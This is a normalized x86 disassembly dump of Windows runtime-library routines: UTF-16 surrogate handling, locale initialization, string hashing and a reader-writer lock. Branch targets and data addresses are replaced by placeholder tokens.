je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov ebx eax
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
sub_4174ec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_4175b9
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x8 ] 0x0
jg r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
test al al
jne r-xdata
cmp eax [ ebp - 0x8 ]
setl al
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4175c0
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov esi 0x1
cmp esi [ ebp - 0x8 ]
jg r-xdata
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
movzx edi [ ebx + esi * 2 - 0x2 ]
cmp di 0xd800
jb r-xdata
mov eax ebx
sub eax 0xa
cmp [ eax ] 0x2
je r-xdata
inc esi
cmp di 0xdfff
ja r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov ebx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4179e8
mov esi eax
jmp r-xdata
inc [ ebp - 0xc ]
cmp esi [ ebp - 0x8 ]
jle r-xdata
sub_4175d4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_4176e1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov [ ebp - 0x14 ] eax
mov edi 0x1
mov ebx 0x1
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
cmp ebx [ ebp - 0x14 ]
jge r-xdata
cmp edi [ ebp - 0x8 ]
jne r-xdata
cmp edi [ ebp - 0x8 ]
jl r-xdata
mov eax [ ebp - 0x10 ]
mov [ eax ] edi
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4176e8
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
cmp ebx [ ebp - 0x14 ]
jge r-xdata
inc edi
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ esi + ebx * 2 - 0x2 ] 0xd800
jb r-xdata
mov eax esi
sub eax 0xa
cmp [ eax ] 0x2
je r-xdata
movzx edx [ eax + ebx * 2 - 0x2 ]
cmp dx 0xd800
jb r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
inc ebx
cmp [ esi + ebx * 2 - 0x2 ] 0xdfff
ja r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov esi eax
cmp dx 0xdfff
ja r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
add ebx 0x2
cmp ebx [ ebp - 0x14 ]
jle r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4179e8
dec eax
mov ebx eax
dec edi
dec ebx
jmp r-xdata
sub_4176f4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_4177c3
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
test ebx ebx
jg r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
test al al
jne r-xdata
cmp eax ebx
setl al
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4177ca
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
mov esi ebx
dec esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4175d4
cmp esi [ ebp - 0xc ]
jle r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
test al al
je r-xdata
cmp eax [ ebp - 0x8 ]
setle al
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
dec ebx
jle r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc [ ebp - 0x8 ]
sub_4177dc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_4178dc
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4178e3
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
cmp eax ebx
jge r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4175d4
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
add eax eax
cmp eax [ ebp - 0x8 ]
jge r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov ebx eax
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
add eax eax
mov [ ebp - 0x8 ] eax
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
sub_4178f4
movzx edx [ eax ]
cmp dx 0xd800
jb r-xdata
mov eax 0x2
retn
cmp dx 0xdbff
ja r-xdata
cmp [ eax + 0x2 ] 0xdc00
jb r-xdata
cmp [ eax + 0x2 ] 0xdfff
ja r-xdata
mov eax 0x4
retn
sub_417924
movzx edx [ eax ]
cmp dx 0xd800
jb r-xdata
test dx dx
je r-xdata
cmp dx 0xdbff
ja r-xdata
retn
add eax 0x2
cmp [ eax + 0x2 ] 0xdc00
jb r-xdata
cmp [ eax + 0x2 ] 0xdfff
ja r-xdata
add eax 0x4
retn
sub_417954
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_4179d8
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi 0x2
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
movzx edx [ eax + ebx * 2 - 0x2 ]
cmp dx 0xd800
jb r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4179df
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
cmp dx 0xdfff
ja r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov eax [ ebp - 0x4 ]
call sub_407134
mov edx ebx
add edx edx
add eax edx
sub eax 0x2
call sub_4178f4
mov esi eax
sub_4179e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_417a73
push [ fs : eax ]
mov [ fs : eax ] esp
lea esi [ ebx + 0x1 ]
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
movzx edx [ eax + ebx * 2 - 0x2 ]
cmp dx 0xd800
jb r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417a7a
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
cmp dx 0xdfff
ja r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov eax [ ebp - 0x4 ]
call sub_407134
mov edx ebx
add edx edx
add eax edx
sub eax 0x2
call sub_4178f4
mov esi eax
sar esi 0x1
jns r-xdata
add esi ebx
adc esi 0x0
sub_417a84
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_417b34
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jle r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
xor eax eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417330
test al al
sete al
jmp r-xdata
cmp [ eax + ebx * 2 - 0x2 ] 0x5c
sete al
jmp r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
cmp eax ebx
setge al
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417b3b
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
test al al
je r-xdata
sub_417b44
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
mov eax ebx
mov edx esi
call sub_4070a8
mov eax [ ebx ]
mov [ esp ] eax
mov esi [ esp ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov edx esi
call sub_417a84
test al al
jne r-xdata
sub esi 0x4
mov esi [ esi ]
pop edx
pop esi
pop ebx
retn
mov eax ebx
mov edx r-xdata
call sub_4074a4
sub_417b94
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
mov eax [ ebp - 0x8 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_417c62
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_406a50
mov edi eax
test edi edi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
push edi
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
mov eax [ ebp - 0x8 ]
call sub_407134
mov ecx ebx
pop edx
call sub_412840
mov ebx eax
test ebx ebx
je r-xdata
sub edi 0x4
mov edi [ edi ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417c69
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_4068c4
retn
mov eax [ ebp - 0x8 ]
call sub_407134
mov esi ebx
sub esi eax
sar esi 0x1
jns r-xdata
inc esi
adc esi 0x0
sub_417c8c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xffffffec
push edi
push 0x0
call GetCPInfo
xor esi esi
jmp r-xdata
cmp esi 0xc
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
movzx eax [ edi + esi + 0x6 ]
or al [ edi + esi + 0x7 ]
jne r-xdata
movzx eax [ edi + esi + 0x6 ]
movzx ebx [ edi + esi + 0x7 ]
sub bl al
jb r-xdata
add esi 0x2
inc ebx
mov [ ebp - 0x1 ] al
movzx eax [ ebp - 0x1 ]
movzx eax al
bts [ rw-data ] eax
inc [ ebp - 0x1 ]
dec bl
jne r-xdata
sub_417ce8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx rw-data
mov [ ebx ] 0x409
mov [ ebx + 0x4 ] 0x9
mov [ ebx + 0x8 ] 0x1
call GetThreadLocale
test eax eax
je r-xdata
test ax ax
je r-xdata
mov [ ebx ] eax
mov esi r-xdata
mov edi rw-data
mov ecx 0x8
[ edi ] [ esi ]
cmp [ rw-data ] 0x4
jle r-xdata
mov edx eax
and dx 0x3ff
movzx edx dx
mov [ ebx + 0x4 ] edx
movzx eax ax
shr eax 0xa
mov [ ebx + 0x8 ] eax
push 0x4a
call GetSystemMetrics
test eax eax
setne al
mov [ ebx + 0xd ] al
cmp [ rw-data ] 0x2
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_417c8c
pop ecx
mov [ ebx + 0xd ] 0x1
jmp r-xdata
mov al 0x1
mov [ ebx + 0xc ] al
test al al
je r-xdata
sub_417da0
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
xor eax eax
push ebp
push sub_41807e
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_417ce8
call sub_415820
cmp [ rw-data ] 0x0
je r-xdata
call GetThreadLocale
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx 0x14
mov eax ebx
call sub_415768
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_4070a8
lea eax [ ebp - 0x14 ]
push eax
mov ecx r-xdata
mov edx 0x1b
mov eax ebx
call sub_415768
mov eax [ ebp - 0x14 ]
xor edx edx
call sub_411bac
mov [ rw-data ] al
lea eax [ ebp - 0x18 ]
push eax
mov ecx r-xdata
mov edx 0x1c
mov eax ebx
call sub_415768
mov eax [ ebp - 0x18 ]
xor edx edx
call sub_411bac
mov [ rw-data ] al
mov cx 0x2c
mov edx 0xf
mov eax ebx
call sub_4157b4
mov [ rw-data ] ax
mov cx 0x2e
mov edx 0xe
mov eax ebx
call sub_4157b4
mov [ rw-data ] ax
lea eax [ ebp - 0x1c ]
push eax
mov ecx r-xdata
mov edx 0x19
mov eax ebx
call sub_415768
mov eax [ ebp - 0x1c ]
xor edx edx
call sub_411bac
mov [ rw-data ] al
mov cx 0x2f
mov edx 0x1d
mov eax ebx
call sub_4157b4
mov [ rw-data ] ax
lea eax [ ebp - 0x24 ]
push eax
mov ecx r-xdata
mov edx 0x1f
mov eax ebx
call sub_415768
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_415aac
mov edx [ ebp - 0x20 ]
mov eax rw-data
call sub_4070a8
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx 0x20
mov eax ebx
call sub_415768
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_415aac
mov edx [ ebp - 0x28 ]
mov eax rw-data
call sub_4070a8
mov cx 0x3a
mov edx 0x1e
mov eax ebx
call sub_4157b4
mov [ rw-data ] ax
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx 0x28
mov eax ebx
call sub_415768
mov edx [ ebp - 0x30 ]
mov eax rw-data
call sub_4070a8
lea eax [ ebp - 0x34 ]
push eax
mov ecx r-xdata
mov edx 0x29
mov eax ebx
call sub_415768
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_4070a8
lea eax [ ebp - 0x8 ]
xor edx edx
call sub_4070fc
lea eax [ ebp - 0xc ]
xor edx edx
call sub_4070fc
lea eax [ ebp - 0x38 ]
push eax
mov ecx r-xdata
mov edx 0x25
mov eax ebx
call sub_415768
mov eax [ ebp - 0x38 ]
xor edx edx
call sub_411bac
test eax eax
jne r-xdata
call sub_4159f8
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4070fc
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4070fc
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_407648
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_407648
mov cx 0x2c
mov edx 0xc
mov eax ebx
call sub_4157b4
mov [ rw-data ] ax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418085
lea eax [ ebp - 0x40 ]
mov edx 0x10
call j_sub_4068c4
retn
lea eax [ ebp - 0x40 ]
push eax
mov ecx r-xdata
mov edx 0x1005
mov eax ebx
call sub_415768
mov eax [ ebp - 0x40 ]
xor edx edx
call sub_411bac
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx r-xdata
mov edx 0x23
mov eax ebx
call sub_415768
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_411bac
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4070fc
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4070fc
jmp r-xdata
sub_4182cc
push ebx
push esi
push edi
push ebp
add esp 0xfffffdf8
mov ebx eax
mov eax ebx
call sub_406bd4
mov ebp eax
push 0x0
push 0x0
push ebp
push ebx
push 0x0
push 0xfde9
call MultiByteToWideChar
mov edi eax
cmp edi 0x104
jbe r-xdata
mov esi esp
mov eax edi
add eax eax
call sub_404204
mov esi eax
jmp r-xdata
mov eax esp
cmp esi eax
je r-xdata
inc eax
xor edx edx
push edi
push esi
push ebp
push ebx
push 0x0
push 0xfde9
call MultiByteToWideChar
push edi
push esi
call CharUpperBuffW
xor ebx ebx
mov eax edi
dec eax
test eax eax
jl r-xdata
mov eax ebx
add esp 0x208
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_404220
mov ecx ebx
shl ecx 0x5
shr ebx 0x1b
or ecx ebx
mov ebx ecx
movzx ecx [ esi + edx * 2 ]
xor ebx ecx
inc edx
dec eax
jne r-xdata
sub_418360
push esi
push ebx
mov esi eax
xor eax eax
push esi
pop eax
pop ebx
pop esi
jmp sub_4182cc
cmp bl 0x0
je r-xdata
pop ecx
pop ebx
pop esi
retn
cmp bl 0x41
jl r-xdata
xor al bl
inc esi
jmp r-xdata
cmp bl 0x5a
jg r-xdata
rol eax 0x5
mov bl [ esi ]
test bl 0x80
jne r-xdata
or bl 0x20
sub_418398
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edx [ rw-data ]
mov edx [ edx ]
test edx edx
je r-xdata
mov [ esp ] edx
cmp [ esp ] 0x0
je r-xdata
cmp eax [ edx + 0x4 ]
je r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov edx [ edx ]
test edx edx
jne r-xdata
mov eax [ esp ]
mov ebx [ eax + 0x18 ]
cmp [ ebx ] 0x0
je r-xdata
mov [ esp + 0x8 ] rw-data
mov [ esp + 0x8 ] rw-data
jmp r-xdata
mov edx [ r-xdata ]
mov eax ebx
call sub_4081e0
mov eax [ esp ]
xor edx edx
mov [ eax + 0x18 ] edx
inc ebp
xor esi esi
mov eax [ ebx + 0x4 ]
call sub_40875c
mov ebp eax
test ebp ebp
jl r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + edi * 8 + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + edi * 8 ]
lea edx [ esi + esi * 2 ]
mov ecx [ ebx + 0x4 ]
mov edx [ ecx + edx * 8 + 0x4 ]
mov [ edx ] eax
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + edi * 8 ] 0x0
je r-xdata
lea eax [ esi + esi * 2 ]
mov edx [ ebx + 0x4 ]
mov eax [ edx + eax * 8 + 0xc ]
call sub_418360
mov ecx 0x3fd
xor edx edx
div ecx
mov [ esp + 0x4 ] edx
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ eax + edx * 4 ]
mov edx [ ebx + 0x4 ]
lea edx [ edx + edi * 8 ]
cmp eax edx
jne r-xdata
inc esi
dec ebp
jne r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + edi * 8 + 0x4 ]
lea edx [ esi + esi * 2 ]
mov ecx [ ebx + 0x4 ]
mov edx [ ecx + edx * 8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x4 ]
mov eax [ eax + edi * 8 ]
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov [ edx + ecx * 4 ] eax
lea edi [ esi + esi * 2 ]
mov eax [ ebx + 0x4 ]
cmp [ eax + edi * 8 + 0x4 ] 0x0
je r-xdata
sub_4184c4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41854f
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
mov edx eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_415718
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x11
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
mov edx eax
jmp r-xdata
mov [ edx + 0x18 ] ebx
mov eax edx
call sub_4060b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418556
lea eax [ ebp - 0x14 ]
call j_sub_4068a0
retn
sub_41856c
push ebx
push esi
mov bl 0x1
mov esi [ rw-data ]
jmp r-xdata
test bl bl
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
test esi esi
jne r-xdata
call [ esi + 0x4 ]
mov ebx eax
mov esi [ esi ]
sub_41858c
push ebx
push esi
mov esi rw-data
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov ebx [ esi ]
mov eax [ ebx ]
mov [ esi ] eax
mov edx 0x8
mov eax ebx
call sub_404220
pop esi
pop ebx
retn
sub_4185b0
push ebx
push r-xdata
call GetModuleHandleW
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call sub_40bb70
mov [ rw-data ] eax
pop ebx
retn
mov eax sub_4124ac
mov [ rw-data ] eax
sub_418654
push ebx
push esi
push edi
push ebp
push ecx
call sub_405bb4
mov [ esp ] dl
mov ebp eax
xor edi edi
inc edi
cmp edi 0x10
jne r-xdata
mov esi ebx
mov ebx [ ebx ]
mov eax esi
call sub_404220
test ebx ebx
jne r-xdata
mov ebx [ ebp + edi * 4 + 0x4 ]
xor eax eax
mov [ ebp + edi * 4 + 0x4 ] eax
test ebx ebx
je r-xdata
movzx edx [ esp ]
and dl 0xfc
mov eax ebp
call sub_4055e0
cmp [ esp ] 0x0
jle r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_405b5c
sub_4186c8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_4186ac
mov ebx eax
call GetCurrentThreadId
mov esi eax
movzx eax bl
mov ebp [ edi + eax * 4 + 0x4 ]
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
cmp esi [ ebp + 0x4 ]
jne r-xdata
mov eax [ esp ]
mov [ eax ] ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_418758
mov ebp eax
test ebp ebp
jne r-xdata
mov ebp [ ebp ]
mov eax 0x10
call sub_4041ec
mov ebp eax
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] 0x7fffffff
mov [ ebp ] ebp
movzx eax bl
lea eax [ edi + eax * 4 + 0x4 ]
mov edx ebp
call sub_418644
mov [ ebp ] eax
sub_418758
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4186ac
movzx eax al
mov ebx [ ebx + eax * 4 + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
lea eax [ ebx + 0x8 ]
mov edx 0x7fffffff
call sub_418644
mov esi eax
cmp esi 0x7fffffff
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
call GetCurrentThreadId
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_41879c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4055c0
mov [ esi + 0xc ] 0xffff
push 0x0
push 0xffffffff
push 0xffffffff
push 0x0
call CreateEventW
mov [ esi + 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventW
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ esi + 0x20 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax esi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_418810
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
mov eax esi
call sub_41889c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4055e0
mov eax [ esi + 0x10 ]
push eax
call CloseHandle
mov eax [ esi + 0x14 ]
push eax
call CloseHandle
mov eax [ esi + 0x20 ]
call sub_4055f0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_41889c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp eax
mov bl 0x1
call GetCurrentThreadId
mov edi eax
cmp edi [ ebp + 0x24 ]
je r-xdata
inc [ ebp + 0x1c ]
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_418858
mov eax [ ebp + 0x28 ]
mov [ esp + 0x4 ] eax
mov edx esp
mov eax [ ebp + 0x20 ]
call sub_4186c8
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
seta bl
test bl bl
je r-xdata
lea eax [ ebp + 0xc ]
mov edx 0xffff0001
call sub_41864c
cmp eax 0xffff
jne r-xdata
lea eax [ ebp + 0xc ]
call sub_41862c
jmp r-xdata
lea eax [ ebp + 0xc ]
mov edx 0xffff
call sub_41864c
mov esi eax
test esi esi
je r-xdata
mov eax ebp
call sub_418858
test bl bl
je r-xdata
mov eax ebp
call sub_41888c
mov [ ebp + 0x24 ] edi
lea eax [ ebp + 0x28 ]
call sub_41862c
dec eax
cmp eax [ esp + 0x4 ]
sete bl
lea eax [ ebp + 0xc ]
call sub_418638
sub_418948
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_4186c8
dec [ ebx + 0x1c ]
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0xc ]
mov edx 0xffff
call sub_41864c
mov eax ebx
call sub_418870
mov eax ebx
call sub_418864
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_418748
sub_418998
push ebx
push esi
push edi
push ecx
mov edi eax
mov edx esp
mov eax [ edi + 0x20 ]
call sub_4186c8
mov eax [ esp ]
inc [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x1
seta bl
call GetCurrentThreadId
cmp eax [ edi + 0x24 ]
je r-xdata
pop edx
pop edi
